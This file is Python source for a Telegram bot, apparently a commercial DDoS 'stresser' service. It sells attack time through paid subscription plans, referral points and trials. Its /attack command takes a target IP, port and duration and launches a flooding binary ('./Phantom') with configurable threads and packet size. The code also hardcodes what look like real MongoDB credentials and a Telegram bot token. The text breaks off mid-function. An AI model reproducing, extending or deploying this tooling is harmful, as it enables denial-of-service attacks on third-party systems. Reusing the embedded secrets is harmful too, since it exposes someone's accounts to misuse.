import os
import socket
import subprocess
import asyncio
import platform
import random
import pytz
import string
import psutil
import qrcode
import uuid
from io import BytesIO
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, CallbackContext
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone

# Global variable to track bot start time
BOT_START_TIME = datetime.now(timezone.utc)

# Database Configuration
MONGO_URI = 'mongodb+srv://harry:Sachdeva@cluster1.b02ct.mongodb.net/?retryWrites=true&w=majority&appName=Cluster1'
client = MongoClient(MONGO_URI)
db = client['cine']
users_collection = db['users']
settings_collection = db['settings']
redeem_codes_collection = db['redeem_codes']
attack_logs_collection = db['user_attack_logs']
transactions_collection = db['transactions']
referrals_collection = db['referrals']

# Bot Configuration
TELEGRAM_BOT_TOKEN = '8012442954:AAFEcP0vxG4BO7VBIeeQ5RiNfle1eXCtA1A'
ADMIN_USER_ID = 1929943036
COOLDOWN_PERIOD = timedelta(minutes=1)
CHANNEL_ID = '@NeoModEngine_Ddos_bot'  # Replace with your channel's Telegram handle
POINTS_PER_REFERRAL = 10
POINTS_PER_ATTACK = 5
user_last_attack_time = {}
user_attack_history = {}
cooldown_dict = {}

# Default values
DEFAULT_BYTE_SIZE = 24
DEFAULT_THREADS = 900
DEFAULT_MAX_ATTACK_TIME = 240
LOCAL_TIMEZONE = pytz.timezone("Asia/Kolkata")

# Subscription plans
SUBSCRIPTION_PLANS = {
    "1day": {"days": 1, "amount": 120},
    "2day": {"days": 2, "amount": 190},
    "3day": {"days": 3, "amount": 280},
    "4day": {"days": 4, "amount": 350},
    "5day": {"days": 5, "amount": 400},
    "6day": {"days": 6, "amount": 450},
    "7day": {"days": 7, "amount": 500},
    "trial": {"days": 0, "minutes": 30, "amount": 0}
}

def generate_user_code():
    """Generate a unique user code (3 letters + 5 digits)."""
    letters = ''.join(random.choices(string.ascii_uppercase, k=3))
    digits = ''.join(random.choices(string.digits, k=5))
    return letters + digits

async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        help_text = (
            "*Here are the commands you can use:* \n\n"
            "*ðŸ”¸ /start* - Start interacting with the bot.\n"
            "*ðŸ”¸ /menu* - Open the interactive menu.\n"
            "*ðŸ”¸ /attack* - Trigger an attack operation.\n"
            "*ðŸ”¸ /redeem* - Redeem a code.\n"
            "*ðŸ”¸ /price* - View the pricing for bot services.\n"
            "*ðŸ”¸ /status* - Check the bot's VPS status.\n"
        )
    else:
        help_text = (
            "*ðŸ’¡ Available Commands for Admins:*\n\n"
            "*ðŸ”¸ /start* - Start the bot.\n"
            "*ðŸ”¸ /menu* - Open the interactive menu.\n"
            "*ðŸ”¸ /attack* - Start the attack.\n"
            "*ðŸ”¸ /add [user_id]* - Add a user.\n"
            "*ðŸ”¸ /remove [user_id]* - Remove a user.\n"
            "*ðŸ”¸ /thread [number]* - Set number of threads.\n"
            "*ðŸ”¸ /byte [size]* - Set the byte size.\n"
            "*ðŸ”¸ /show* - Show current settings.\n"
            "*ðŸ”¸ /users* - List all allowed users.\n"
            "*ðŸ”¸ /gen* - Generate a redeem code.\n"
            "*ðŸ”¸ /redeem* - Redeem a code.\n"
            "*ðŸ”¸ /cleanup* - Clean up stored data.\n"
            "*ðŸ”¸ /argument [type]* - Set the (3, 4, or 5).\n"
            "*ðŸ”¸ /delete_code* - Delete a redeem code.\n"
            "*ðŸ”¸ /list_codes* - List all redeem codes.\n"
            "*ðŸ”¸ /set_time* - Set max attack time.\n"
            "*ðŸ”¸ /log [user_id]* - View attack history.\n"
            "*ðŸ”¸ /delete_log [user_id]* - Delete history.\n"
            "*ðŸ”¸ /extend_expiry* - Extend Expiry.\n"
            "*ðŸ”¸ /broadcast* - Broadcast message to all user.\n"
            "*ðŸ”¸ /set_cooldown* - Set the cooldown period.\n"
            "*ðŸ”¸ /price* - View the pricing for bot services.\n"
            "*ðŸ”¸ /status* - Check the bot's VPS status.\n"
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')

async def menu(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("Attack", callback_data='menu_attack')],
        [InlineKeyboardButton("Pay Now", callback_data='menu_paynow')],
        [InlineKeyboardButton("Check Balance", callback_data='menu_balance')],
        [InlineKeyboardButton("Refer & Earn", callback_data='menu_refer')],
        [InlineKeyboardButton("Leaderboard", callback_data='menu_leaderboard')],
        [InlineKeyboardButton("Trial", callback_data='menu_trial')],
        [InlineKeyboardButton("Txn History", callback_data='menu_txn')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="*ðŸ“‹ Bot Menu:*\nChoose an option below:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def price(update: Update, context: CallbackContext):
    user_first_name = update.effective_user.first_name
    price_text = (
        f"Hello, {user_first_name}! ðŸ‘‹\n\n"
        "ðŸ’° *Pricing for the bot services:*\n"
        "---------------------------\n"
        "â€¢ 1 Day:   â‚¹120\n"
        "â€¢ 2 Day:   â‚¹190\n"
        "â€¢ 3 Day:   â‚¹280\n"
        "â€¢ 4 Day:   â‚¹350\n"
        "â€¢ 5 Day:   â‚¹400\n"
        "â€¢ 6 Day:   â‚¹450\n"
        "â€¢ 7 Day:   â‚¹500\n"
        "ðŸ” *For private inquiries, reach out to the owners:* @IamSachin_Official"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=price_text, parse_mode='Markdown')

async def status(update: Update, context: CallbackContext):
    current_time = datetime.now(timezone.utc)
    running_time = current_time - BOT_START_TIME
    days = running_time.days
    seconds = running_time.seconds
    hours = seconds // 3600
    minutes = (seconds % 3600) // 60
    seconds = seconds % 60
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()
    ram_usage = memory_info.percent
    status_text = (
        "*Bot Status:*\n"
        f"â³ *Bot Running Time:* {days}D-{hours}H-{minutes}M-{seconds}S\n"
        f"ðŸ’» *CPU Usage:* {cpu_usage}%\n"
        f"ðŸ’¾ *RAM Usage:* {ram_usage}%\n"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=status_text, parse_mode='Markdown')

async def check_balance(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user = users_collection.find_one({"user_id": user_id})
    current_time = datetime.now(timezone.utc)
    
    balance_text = "*ðŸ’³ Account Balance:*\n"
    
    # Check subscription status
    if not user or not user.get('expiry_date') or user['expiry_date'] <= current_time:
        balance_text += "â° *Subscription:* No active subscription\n"
    else:
        expiry_date = user['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        time_remaining = expiry_date - current_time
        days = time_remaining.days
        hours = time_remaining.seconds // 3600
        minutes = (time_remaining.seconds % 3600) // 60
        balance_text += (
            f"â° *Subscription:* {days}D-{hours}H-{minutes}M remaining\n"
            f"ðŸ“… *Expiry Date:* {expiry_date.astimezone(LOCAL_TIMEZONE).strftime('%Y-%m-%d %I:%M %p')}\n"
        )
    
    # Check points
    points = user.get('points', 0) if user else 0
    balance_text += f"ðŸŒŸ *Points:* {points} (Use {POINTS_PER_ATTACK} points per attack)"
    
    await context.bot.send_message(chat_id=update.effective_chat.id, text=balance_text, parse_mode='Markdown')

async def refer_and_earn(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user = users_collection.find_one({"user_id": user_id})
    
    # Generate or retrieve referral code and user code
    if not user or not user.get('referral_code'):
        referral_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        user_code = generate_user_code()
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"referral_code": referral_code, "user_code": user_code, "points": 0, "referred_users": []}},
            upsert=True
        )
    else:
        referral_code = user['referral_code']
        user_code = user.get('user_code', generate_user_code())
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"user_code": user_code}},
            upsert=True
        )
    
    referral_count = len(user.get('referred_users', [])) if user else 0
    points = user.get('points', 0) if user else 0
    invite_link = f"https://t.me/{CHANNEL_ID[1:]}?start={referral_code}"
    
    refer_text = (
        "*ðŸ¤ Refer & Earn:*\n"
        f"ðŸ“© *Your Referral Link:* `{invite_link}`\n"
        f"ðŸ‘¥ *Referrals:* {referral_count}\n"
        f"ðŸŒŸ *Points:* {points} ({POINTS_PER_REFERRAL} points per referral)\n"
        f"ðŸ“‹ *How it works:*\n"
        f"- Share your link with friends.\n"
        f"- When they join {CHANNEL_ID} and start the bot, you earn {POINTS_PER_REFERRAL} points.\n"
        f"- Use {POINTS_PER_ATTACK} points to launch an attack with /attack."
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=refer_text, parse_mode='Markdown')

async def leaderboard(update: Update, context: CallbackContext):
    # Find users with non-zero points
    top_users = users_collection.find({"points": {"$gt": 0}}).sort("points", -1).limit(5)
    
    if users_collection.count_documents({"points": {"$gt": 0}}) == 0:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*ðŸ† Leaderboard:*\nNo users with points yet.",
            parse_mode='Markdown'
        )
        return
    
    leaderboard_text = "*ðŸ† Leaderboard (Top 5 Referrers):*\n"
    for i, user in enumerate(top_users, 1):
        leaderboard_text += f"{i}. User ID: {user['user_id']} - Points: {user['points']}\n"
    
    await context.bot.send_message(chat_id=update.effective_chat.id, text=leaderboard_text, parse_mode='Markdown')

async def trial(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user = users_collection.find_one({"user_id": user_id})
    
    if user and user.get('trial_used', False):
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*âŒ You have already used your trial.*",
            parse_mode='Markdown'
        )
        return
    
    expiry_date = datetime.now(timezone.utc) + timedelta(minutes=30)
    user_code = generate_user_code()
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date, "trial_used": True, "points": 0, "referred_users": [], "user_code": user_code}},
        upsert=True
    )
    transactions_collection.insert_one({
        "user_id": user_id,
        "plan": "trial",
        "amount": 0,
        "order_id": str(uuid.uuid4()),
        "timestamp": datetime.now(timezone.utc),
        "status": "completed"
    })
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="*âœ… Trial Activated!*\nYou have 30 minutes of access.",
        parse_mode='Markdown'
    )

async def txn_history(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    transactions = transactions_collection.find({"user_id": user_id}).sort("timestamp", -1).limit(10)
    
    if transactions_collection.count_documents({"user_id": user_id}) == 0:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*ðŸ“œ Transaction History:*\nNo transactions found.",
            parse_mode='Markdown'
        )
        return
    
    history_text = "*ðŸ“œ Transaction History:*\n"
    for txn in transactions:
        timestamp = txn['timestamp'].replace(tzinfo=timezone.utc).astimezone(LOCAL_TIMEZONE)
        history_text += (
            f"Plan: {txn['plan'].capitalize()}\n"
            f"Amount: â‚¹{txn['amount']}\n"
            f"Order ID: {txn['order_id']}\n"
            f"Date: {timestamp.strftime('%Y-%m-%d %I:%M %p')}\n"
            f"Status: {txn['status'].capitalize()}\n\n"
        )
    
    await context.bot.send_message(chat_id=update.effective_chat.id, text=history_text, parse_mode='Markdown')

async def pay_now_menu(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("1 Day - â‚¹120", callback_data='pay_1day')],
        [InlineKeyboardButton("2 Day - â‚¹190", callback_data='pay_2day')],
        [InlineKeyboardButton("3 Day - â‚¹280", callback_data='pay_3day')],
        [InlineKeyboardButton("4 Day - â‚¹350", callback_data='pay_4day')],
        [InlineKeyboardButton("5 Day - â‚¹400", callback_data='pay_5day')],
        [InlineKeyboardButton("6 Day - â‚¹450", callback_data='pay_6day')],
        [InlineKeyboardButton("7 Day - â‚¹500", callback_data='pay_7day')],
        [InlineKeyboardButton("Trial Plan", callback_data='pay_trial')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="*Choose a subscription plan:*\nCurrent time: " + datetime.now(LOCAL_TIMEZONE).strftime('%I:%M %p'),
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def generate_qr_code(order_id, amount, days):
    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    payment_url = f"https://example.com/pay?order_id={order_id}&amount={amount}"
    qr.add_data(payment_url)
    qr.make(fit=True)
    img = qr.make_image(fill='black', back_color='white')
    bio = BytesIO()
    img.save(bio, format="PNG")
    bio.seek(0)
    return bio

async def process_payment(update: Update, context: CallbackContext, plan_key: str):
    user_id = update.effective_user.id
    plan = SUBSCRIPTION_PLANS[plan_key]
    order_id = str(uuid.uuid4())
    amount = plan["amount"]
    
    # Generate QR code
    qr_image = await generate_qr_code(order_id, amount, plan.get("days", 0))
    
    # Simulate payment verification
    current_time = datetime.now(timezone.utc)
    expiry_date = users_collection.find_one({"user_id": user_id})
    if expiry_date and expiry_date.get('expiry_date') and expiry_date['expiry_date'] > current_time:
        new_expiry = expiry_date['expiry_date']
    else:
        new_expiry = current_time
    
    if plan_key == "trial":
        if users_collection.find_one({"user_id": user_id, "trial_used": True}):
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="*âŒ You have already used your trial.*",
                parse_mode='Markdown'
            )
            return
        new_expiry = new_expiry + timedelta(minutes=plan["minutes"])
        user_code = generate_user_code()
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"expiry_date": new_expiry, "trial_used": True, "user_code": user_code}},
            upsert=True
        )
    else:
        new_expiry = new_expiry + timedelta(days=plan["days"])
        user_code = generate_user_code()
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"expiry_date": new_expiry, "user_code": user_code}},
            upsert=True
        )
    
    # Log transaction
    transactions_collection.insert_one({
        "user_id": user_id,
        "plan": plan_key,
        "amount": amount,
        "order_id": order_id,
        "timestamp": current_time,
        "status": "completed"
    })
    
    # Send QR code and payment details
    payment_text = (
        "*ðŸ–¤ PAYMENT DETAILS ðŸ–¤*\n"
        "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
        f"ðŸ’° *Amount:* Pay â‚¹{amount} for {plan.get('days', 0) or '0.5'} days access.\n"
        f"ðŸ†” *Order ID:* {order_id}\n"
        "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
        "ðŸ“Œ *Scan the QR Code Above*\n"
        "âœ… *Your payment will be verified automatically!*"
    )
    await context.bot.send_photo(
        chat_id=update.effective_chat.id,
        photo=qr_image,
        caption=payment_text,
        parse_mode='Markdown'
    )
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="*âœ… Subscription activated!*\nYour access has been updated.",
        parse_mode='Markdown'
    )

async def callback_query_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    if data == 'menu_attack':
        await query.message.reply_text(
            "*âš”ï¸ Enter attack details:*\nUse `/attack <ip> <port> <duration>`",
            parse_mode='Markdown'
        )
    elif data == 'menu_paynow':
        await pay_now_menu(update, context)
    elif data == 'menu_balance':
        await check_balance(update, context)
    elif data == 'menu_refer':
        await refer_and_earn(update, context)
    elif data == 'menu_leaderboard':
        await leaderboard(update, context)
    elif data == 'menu_trial':
        await trial(update, context)
    elif data == 'menu_txn':
        await txn_history(update, context)
    elif data.startswith('pay_'):
        plan_key = data.split('_')[1]
        await process_payment(update, context, plan_key)

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    # Initialize or retrieve user data
    user = users_collection.find_one({"user_id": user_id})
    if not user:
        user_code = generate_user_code()
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"points": 0, "referred_users": [], "user_code": user_code}},
            upsert=True
        )
    else:
        user_code = user.get('user_code', generate_user_code())
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"user_code": user_code}},
            upsert=True
        )
    
    # Check for referral code
    if context.args:
        referral_code = context.args[0]
        referrer = users_collection.find_one({"referral_code": referral_code})
        if referrer and referrer['user_id'] != user_id:
            try:
                # Verify channel membership
                member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
                if member.status in ['member', 'administrator', 'creator']:
                    # Check if user was already referred
                    if user_id not in referrer.get('referred_users', []):
                        # Award points to referrer
                        users_collection.update_one(
                            {"user_id": referrer['user_id']},
                            {
                                "$inc": {"points": POINTS_PER_REFERRAL},
                                "$push": {"referred_users": user_id}
                            }
                        )
                        referrals_collection.insert_one({
                            "referrer_id": referrer['user_id'],
                            "referred_id": user_id,
                            "timestamp": datetime.now(timezone.utc)
                        })
                        await context.bot.send_message(
                            chat_id=referrer['user_id'],
                            text=f"*ðŸŽ‰ Referral Success!*\nYou earned {POINTS_PER_REFERRAL} points for referring a new user.",
                            parse_mode='Markdown'
                        )
                else:
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=f"*âš ï¸ Please join {CHANNEL_ID} to complete the referral.*",
                        parse_mode='Markdown'
                    )
                    return
            except Exception:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=f"*âš ï¸ Please join {CHANNEL_ID} to complete the referral.*",
                    parse_mode='Markdown'
                )
                return
    
    # Determine user status
    is_approved = await is_user_allowed(user_id)
    status_text = "ðŸŸ¢ Status: Approved" if is_approved else "ðŸ”´ Status: âš ï¸ Not Approved"
    
    # Send welcome message
    welcome_text = (
        f"*âš¡ Welcome to the battlefield, {user_code}! âš¡*\n\n"
        f"ðŸ‘¤ *User ID:* {user_id}\n"
        f"{status_text}\n\n"
        f"ðŸ’° *Pricing for the bot services* /price"
    )
    await context.bot.send_message(
        chat_id=chat_id,
        text=welcome_text,
        parse_mode='Markdown'
    )

async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âŒ You are not authorized to add users!*", parse_mode='Markdown')
        return
    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âš ï¸ Usage: /add <user_id> <days/minutes>*", parse_mode='Markdown')
        return
    target_user_id = int(context.args[0])
    time_input = context.args[1]
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])
        total_seconds = time_value * 86400
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])
        total_seconds = time_value * 60
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âš ï¸ Please specify time in days (d) or minutes (m).*", parse_mode='Markdown')
        return
    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)
    user_code = generate_user_code()
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"expiry_date": expiry_date, "points": 0, "referred_users": [], "user_code": user_code}},
        upsert=True
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*âœ… User {target_user_id} added with expiry in {time_value} {time_input[-1]}.*", parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âŒ You are not authorized to remove users!*", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âš ï¸ Usage: /remove <user_id>*", parse_mode='Markdown')
        return
    target_user_id = int(context.args[0])
    users_collection.delete_one({"user_id": target_user_id})
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*âœ… User {target_user_id} removed.*", parse_mode='Markdown')

async def set_thread(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âŒ You are not authorized to set the number of threads!*", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âš ï¸ Usage: /thread <number of threads>*", parse_mode='Markdown')
        return
    try:
        threads = int(context.args[0])
        if threads <= 0:
            raise ValueError("Number of threads must be positive.")
        settings_collection.update_one(
            {"setting": "threads"},
            {"$set": {"value": threads}},
            upsert=True
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*âœ… Number of threads set to {threads}.*", parse_mode='Markdown')
    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*âš ï¸ Error: {e}*", parse_mode='Markdown')

async def set_byte(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âŒ You are not authorized to set the byte size!*", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âš ï¸ Usage: /byte <byte size>*", parse_mode='Markdown')
        return
    try:
        byte_size = int(context.args[0])
        if byte_size <= 0:
            raise ValueError("Byte size must be positive.")
        settings_collection.update_one(
            {"setting": "byte_size"},
            {"$set": {"value": byte_size}},
            upsert=True
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*âœ… Byte size set to {byte_size}.*", parse_mode='Markdown')
    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*âš ï¸ Error: {e}*", parse_mode='Markdown')

async def show_settings(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âŒ You are not authorized to view settings!*", parse_mode='Markdown')
        return
    byte_size_setting = settings_collection.find_one({"setting": "byte_size"})
    threads_setting = settings_collection.find_one({"setting": "threads"})
    argument_type_setting = settings_collection.find_one({"setting": "argument_type"})
    max_attack_time_setting = settings_collection.find_one({"setting": "max_attack_time"})
    byte_size = byte_size_setting["value"] if byte_size_setting else DEFAULT_BYTE_SIZE
    threads = threads_setting["value"] if threads_setting else DEFAULT_THREADS
    argument_type = argument_type_setting["value"] if argument_type_setting else 3
    max_attack_time = max_attack_time_setting["value"] if max_attack_time_setting else 60
    settings_text = (
        f"*Current Bot Settings:*\n"
        f"ðŸ—ƒï¸ *Byte Size:* {byte_size}\n"
        f"ðŸ”¢ *Threads:* {threads}\n"
        f"ðŸ”§ *Argument Type:* {argument_type}\n"
        f"â²ï¸ *Max Attack Time:* {max_attack_time} seconds\n"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=settings_text, parse_mode='Markdown')

async def list_users(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âŒ You are not authorized to view users!*", parse_mode='Markdown')
        return
    current_time = datetime.now(timezone.utc)
    users = users_collection.find()
    user_list_message = "ðŸ‘¥ User List:\n"
    for user in users:
        user_id = user['user_id']
        expiry_date = user.get('expiry_date')
        points = user.get('points', 0)
        user_code = user.get('user_code', 'N/A')
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            time_remaining = expiry_date - current_time
            if time_remaining.days < 0:
                remaining_days = 0
                remaining_hours = 0
                remaining_minutes = 0
                expired = True
            else:
                remaining_days = time_remaining.days
                remaining_hours = time_remaining.seconds // 3600
                remaining_minutes = (time_remaining.seconds // 60) % 60
                expired = False
            expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
            status = "ðŸ”´" if expired else "ðŸŸ¢"
        else:
            expiry_label = "No subscription"
            status = "ðŸ”´"
        user_list_message += f"{status} *User ID: {user_id} - Code: {user_code}, Expiry: {expiry_label}, Points: {points}*\n"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user.get('expiry_date')
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def set_argument(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âŒ You are not authorized to set the argument!*", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âš ï¸ Usage: /argument <3|4|5>*", parse_mode='Markdown')
        return
    try:
        argument_type = int(context.args[0])
        if argument_type not in [3, 4, 5]:
            raise ValueError("Argument must be 3, 4, or 5.")
        settings_collection.update_one(
            {"setting": "argument_type"},
            {"$set": {"value": argument_type}},
            upsert=True
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*âœ… Argument type set to {argument_type}.*", parse_mode='Markdown')
    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*âš ï¸ Error: {e}*", parse_mode='Markdown')

async def set_max_attack_time(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âŒ You are not authorized to set the max attack time!*", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âš ï¸ Usage: /set_time <max time in seconds>*", parse_mode='Markdown')
        return
    try:
        max_time = int(context.args[0])
        if max_time <= 0:
            raise ValueError("Max time must be a positive integer.")
        settings_collection.update_one(
            {"setting": "max_attack_time"},
            {"$set": {"value": max_time}},
            upsert=True
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*âœ… Maximum attack time set to {max_time} seconds.*", parse_mode='Markdown')
    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*âš ï¸ Error: {e}*", parse_mode='Markdown')

async def log_attack(user_id, ip, port, duration):
    attack_log = {
        "user_id": user_id,
        "ip": ip,
        "port": port,
        "duration": duration,
        "timestamp": datetime.now(timezone.utc)
    }
    attack_logs_collection.insert_one(attack_log)

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    current_time = datetime.now(timezone.utc)
    
    # Check subscription
    if not await is_user_allowed(user_id):
        await context.bot.send_message(
            chat_id=chat_id,
            text="*âŒ You are not authorized to use this bot!*\nUse /menu to activate a plan or earn points via referrals.",
            parse_mode='Markdown'
        )
        return
    
    # Check points
    user = users_collection.find_one({"user_id": user_id})
    points = user.get('points', 0) if user else 0
    if points < POINTS_PER_ATTACK:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*âš ï¸ Insufficient points!*\nYou need {POINTS_PER_ATTACK} points to attack, but you have {points}.\nUse /menu -> Refer & Earn to get more points.",
            parse_mode='Markdown'
        )
        return
    
    # Check cooldown
    last_attack_time = cooldown_dict.get(user_id)
    if last_attack_time:
        elapsed_time = current_time - last_attack_time
        if elapsed_time < COOLDOWN_PERIOD:
            remaining_time = COOLDOWN_PERIOD - elapsed_time
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*â³ Please wait {remaining_time.seconds // 60} minute(s) and {remaining_time.seconds % 60} second(s) before using /attack again.*",
                parse_mode='Markdown'
            )
            return
    
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*âš ï¸ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return
    
    ip, port, duration = args
    try:
        duration = int(duration)
        max_attack_time_setting = settings_collection.find_one({"setting": "max_attack_time"})
        max_attack_time = max_attack_time_setting["value"] if max_attack_time_setting else DEFAULT_MAX_ATTACK_TIME
        if duration > max_attack_time:
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*âš ï¸ Maximum attack duration is {max_attack_time} seconds. Please reduce the duration.*",
                parse_mode='Markdown'
            )
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*âš ï¸ Duration must be an integer representing seconds.*", parse_mode='Markdown')
        return
    
    # Deduct points
    users_collection.update_one(
        {"user_id": user_id},
        {"$inc": {"points": -POINTS_PER_ATTACK}}
    )
    
    # Proceed with attack
    argument_type = settings_collection.find_one({"setting": "argument_type"})
    argument_type = argument_type["value"] if argument_type else 3
    byte_size = settings_collection.find_one({"setting": "byte_size"})
    threads = settings_collection.find_one({"setting": "threads"})
    byte_size = byte_size["value"] if byte_size else DEFAULT_BYTE_SIZE
    threads = threads["value"] if threads else DEFAULT_THREADS
    if argument_type == 3:
        attack_command = f"./Phantom {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./PHANTOM {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./Phantom {ip} {port} {duration} {byte_size} {threads}"
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*âš”ï¸ Attack Launched! âš”ï¸*\n"
            f"*ðŸŽ¯ Target: {ip}:{port}*\n"
            f"*ðŸ•’ Duration: {duration} seconds*\n"
            f"*ðŸŒŸ Points Used: {POINTS_PER_ATTACK}*\n"
            f"*ðŸ”¥ Let the battlefield ignite! ðŸ’¥*"
        ),
        parse_mode='Markdown'
    )
    
    await log_attack(user_id, ip, port, duration)
    asyncio.create_task(run_attack(chat_id, attack_command, context))
    cooldown_dict[user_id] = current_time
    if user_id not in user_attack_history:
        user_attack_history[user_id] = set()
    user_attack_history[user_id].add((ip, port))

async def view_attack_log(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âŒ You are not authorized to view attack logs!*", parse_mode='Markdown')
        return
    if len(context.args) < 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âš ï¸ Usage: /log <user_id>*", parse_mode='Markdown')
        return
    target_user_id = int(context.args[0])
    attack_logs = attack_logs_collection.find({"user_id": target_user_id})
    if attack_logs_collection.count_documents({"user_id": target_user_id}) == 0:
